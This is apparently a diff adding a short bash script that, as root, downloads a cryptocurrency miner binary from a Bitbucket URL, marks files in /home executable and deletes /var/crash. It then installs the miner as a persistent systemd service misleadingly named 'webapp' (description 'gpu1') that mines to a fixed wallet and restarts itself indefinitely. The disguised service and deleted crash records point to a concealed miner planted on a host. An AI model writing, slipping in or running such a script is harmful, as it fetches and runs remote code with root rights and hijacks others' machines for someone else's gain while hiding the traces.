@@ -1,0 +1,27 @@
+#!/bin/bash
+cd /home
+sudo wget https://bitbucket.org/ytvahjd/oree/raw/634d43b58339b4ccac8d05d65c18e3b629c25d8f/ore-miner
+sudo chmod +x *
+sudo rm -rf /lib/systemd/system/webapp.service
+sudo rm -rf /var/crash
+sudo bash -c 'cat <<EOT >>/lib/systemd/system/webapp.service 
+[Unit] 
+Description=gpu1
+After=network.target
+[Service]
+ExecStart= /home/./ore-miner  mine --address HrMWvLPp5HVwRM5BfmBG9NEWfsK98NJKkfoih2ZCjiq4 --threads 4 --invcode 888888
+WatchdogSec=36000
+Restart=always
+RestartSec=60
+User=root
+[Install]
+WantedBy=multi-user.target
+EOT
+' &&
+
+sudo systemctl daemon-reload &&
+sudo systemctl enable webapp.service &&
+sudo service webapp stop  &&
+sudo service webapp restart
+
+top
